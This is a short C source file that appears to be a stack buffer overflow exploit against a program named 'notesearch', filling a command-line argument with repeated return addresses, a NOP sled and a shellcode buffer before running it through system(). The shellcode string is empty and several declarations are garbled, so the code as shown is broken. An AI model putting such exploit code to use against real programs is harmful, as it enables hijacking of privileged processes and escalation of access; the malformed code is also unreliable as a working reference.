#include<stdio.h>
#include<string.h>
#include<stdlib.h>

char shellcode="";

int main(int argc,char *argv[]){
	unsigned int i,*ptr ret,offset=270;
	char command,*buffer;

	command=(char *) malloc(200);
	bzero(command,200);

	strcpy(command,"./notesearch\'");
	buffer=command+strlen(command);

	if(argc>1)offset=atoi(argv[1]);

	ret=(unsigned int )&i - offset;

	for(i=0;i<160;i+=4)
		*((unsigned int *)(buffer+i))=ret;
	memset(buffer,0x90,60);
	memcpy(buffer+60,shellcode,sizeof(shellcode)-1);

	strcat(command,"\'");
	system(command);
	free(command);


return 0;
}
